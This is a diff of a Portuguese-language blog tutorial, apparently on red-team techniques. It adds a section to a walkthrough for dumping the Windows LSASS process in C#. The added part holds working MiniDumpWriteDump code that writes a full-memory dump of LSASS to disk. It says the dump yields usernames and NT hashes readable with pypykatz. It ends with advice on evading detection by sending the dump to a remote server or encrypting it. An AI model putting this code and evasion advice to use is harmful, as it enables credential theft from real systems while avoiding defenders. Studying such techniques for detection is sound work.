@@ -154,7 +154,7 @@ Console.WriteLine($"[+] Número de handles: {numberOfHandles}");
 
 ![Desktop View](https://i.imgur.com/DK8TlfC.png)
 
-Feito isso, o próximo objetivo é analisar os handles que estão abertos e armazenados no `systemInformationPtr`. Não é uma tarefa tão fácil, já que precisamos acessar handle por handle e realizar uma consulta na tabela `SYSTEM_HANDLE_TABLE_ENTRY_INFO` para descobrirmos seu PID, por exemplo. <br>
+Feito isso, o próximo objetivo é analisar os handles que estão abertos e armazenados no `systemInformationPtr`. Não é uma tarefa tão fácil, já que precisamos acessar handle por handle e realizar uma consulta na tabela `SYSTEM_HANDLE_TABLE_ENTRY_INFO` para descobrirmos seu PID, por exemplo.
 Para isso, é uma boa alternativa a criação de um dicionário que armazenará informações sobre os handles.
 Posteriormente, um loop que passará por todos os handles através do `numberOfHandles`. É neste loop que iteraremos sobre seus respectivos PIDs e, depois, sobre seus níveis de acesso.
 
@@ -430,4 +430,55 @@ E, finalmente! Temos um handle pro LSASS! Vamos pausar a execução do código e
 
 ![Desktop View](https://i.imgur.com/g8SRVNL.png)
 
+## MiniDumpWriteDump¹³
+
+> - `MiniDumpWriteDump¹³`: API utilizada para realizar o dump de um processo Comumente utilizada em ataques no LSASS.
+{: .prompt-info }
+
 Maravilha! Depois de todos esses processos, finalmente possuímos um handle válido pro LSASS! E com permissões de leitura de memória! Agora, será possível realizar o dump do processo.
+
+```csharp
+[Flags]
+public enum MiniDumpType
+{
+    MiniDumpWithFullMemory = 0x00000002
+}
+
+[DllImport("dbghelp.dll", SetLastError = true)]
+public static extern bool MiniDumpWriteDump(
+	IntPtr hProcess,
+	int ProcessId,
+	SafeHandle hFile,
+	MiniDumpType DumpType,
+	IntPtr ExceptionParam,
+	IntPtr UserStreamParam,
+	IntPtr CallbackParam
+);
+
+public static void CreateDumpFile(IntPtr hDuplicate)
+{
+	Console.WriteLine("\n[!] (MiniDumpWriteDump) Criando arquivo de despejo: .\\dump.dmp");
+
+	var fs = new FileStream("dump.dmp", FileMode.Create);
+
+	bool result = MiniDumpWriteDump(
+		hDuplicate, // handle duplicado do LSASS
+		0,
+		fs.SafeFileHandle,
+		MiniDumpType.MiniDumpWithFullMemory,
+		IntPtr.Zero,
+		IntPtr.Zero,
+		IntPtr.Zero
+);
+
+if (result == true) { Console.WriteLine("[+] (MiniDumpWriteDump) Dump realizado com sucesso."); }
+
+}
+```
+
+![Desktop View](https://i.imgur.com/OuBgCMV.png)
+
+E, sucesso! O arquivo ".\dump.dmp" contém o dump do processo do LSASS. Nomes de usuários e suas respectivas hashes NT são de se esperar na leitura deste arquivo, que pode ser feita utilizando a ferramenta `pypykatz`.
+
+> Uma boa prática para evasão seria de não armazenar o arquivo do dump puro no disco. Ao invés disso, enviá-lo a algum servidor de destino ou criptografar o conteúdo do dump antes de salvá-lo num arquivo. Tais práticas evitam a detecção por assinatura de arquivos DMP do LSASS.
+{: .prompt-warning }
